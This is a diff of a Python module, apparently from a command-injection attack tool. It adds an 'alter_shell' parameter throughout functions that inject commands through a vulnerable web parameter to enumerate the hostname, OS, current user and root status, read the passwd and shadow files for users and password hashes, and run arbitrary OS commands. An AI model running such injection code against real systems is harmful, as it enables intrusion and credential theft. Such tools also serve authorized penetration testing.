@@ -29,9 +29,9 @@ from src.core.injections.results_based.techniques.eval_based import eb_injector
 """
 Hostname enumeration
 """
-def hostname(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename):
+def hostname(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename):
   cmd = settings.HOSTNAME
-  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, filename)
+  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = eb_injector.injection_results(response, TAG)
   if shell:
     shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
@@ -49,9 +49,9 @@ def hostname(separator, TAG, prefix, suffix, http_request_method, url, vuln_para
 """
 Retrieve system information
 """
-def system_information(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename): 
+def system_information(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename): 
   cmd = settings.RECOGNISE_OS            
-  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, filename)
+  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
   target_os = eb_injector.injection_results(response, TAG)
   if target_os:
     target_os = "".join(str(p) for p in target_os).replace(" ", "", 1)[:-1]
@@ -59,7 +59,7 @@ def system_information(separator, TAG, prefix, suffix, http_request_method, url,
       print ""
     if target_os == "Linux":
       cmd = settings.RECOGNISE_HP
-      response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, filename)
+      response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
       target_arch = eb_injector.injection_results(response, TAG)
       if target_arch:
         if menu.options.verbose:
@@ -86,9 +86,9 @@ def system_information(separator, TAG, prefix, suffix, http_request_method, url,
 """
 The current user enumeration
 """
-def current_user(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename):
+def current_user(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename):
   cmd = settings.CURRENT_USER
-  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, filename)
+  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
   cu_account = eb_injector.injection_results(response, TAG)
   if cu_account:
     cu_account = "".join(str(p) for p in cu_account).replace(" ", "", 1)[:-1]
@@ -97,7 +97,7 @@ def current_user(separator, TAG, prefix, suffix, http_request_method, url, vuln_
     # Check if the user have super privileges.
     if menu.options.is_root:
       cmd = settings.ISROOT
-      response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, filename)
+      response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
       shell = eb_injector.injection_results(response, TAG)
       if menu.options.verbose:
         print ""
@@ -133,10 +133,12 @@ def current_user(separator, TAG, prefix, suffix, http_request_method, url, vuln_
 """
 System users enumeration
 """
-def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename): 
+def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename): 
   cmd = settings.SYS_USERS             
-  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, filename)
+  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
   sys_users = eb_injector.injection_results(response, TAG)
+  if menu.options.verbose:
+    print ""
   sys.stdout.write("(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
   sys.stdout.flush()
   if sys_users[0] != "  " :
@@ -171,8 +173,6 @@ def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_
         for user in range(0, len(sys_users_list)):
           sys_users = sys_users_list[user]
           sys_users = ":".join(str(p) for p in sys_users)
-          if menu.options.verbose:
-            print ""
           count = count + 1
           fields = sys_users.split(":")
           fields1 = "".join(str(p) for p in fields)
@@ -224,12 +224,14 @@ def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_
 """
 System passwords enumeration
 """
-def system_passwords(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename): 
+def system_passwords(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename): 
   cmd = settings.SYS_PASSES            
-  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, filename)
+  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
   sys_passes = eb_injector.injection_results(response, TAG)
 
   if sys_passes :
+    if menu.options.verbose:
+      print ""
     sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
     sys.stdout.flush()
     sys_passes = "".join(str(p) for p in sys_passes)
@@ -270,9 +272,9 @@ def system_passwords(separator, TAG, prefix, suffix, http_request_method, url, v
 """
 Single os-shell execution
 """
-def single_os_cmd_exec(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename):   
+def single_os_cmd_exec(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename):   
   cmd =  menu.options.os_cmd
-  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, filename)
+  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = eb_injector.injection_results(response, TAG)
   if shell:
     if menu.options.verbose:
@@ -287,9 +289,9 @@ def single_os_cmd_exec(separator, TAG, prefix, suffix, http_request_method, url,
 """
 Check the defined options
 """
-def do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename):
+def do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename):
   if menu.options.hostname:
-    hostname(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename)
+    hostname(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
     settings.ENUMERATION_DONE = True
   elif settings.ENUMERATION_DONE == False:
       print ""
@@ -297,22 +299,22 @@ def do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_para
       print ""
     
   if menu.options.current_user:
-    current_user(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename)
+    current_user(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
     settings.ENUMERATION_DONE = True
 
   if menu.options.sys_info:
-    system_information(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename)
+    system_information(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
     settings.ENUMERATION_DONE = True
 
   if menu.options.users:
-    system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename)
+    system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
     settings.ENUMERATION_DONE = True
 
   if menu.options.passwords:
-    system_passwords(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename)
+    system_passwords(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
     settings.ENUMERATION_DONE = True
 
-  if settings.ENUMERATION_DONE :
+  if settings.ENUMERATION_DONE and not menu.options.verbose:
     print ""
     
 # eof
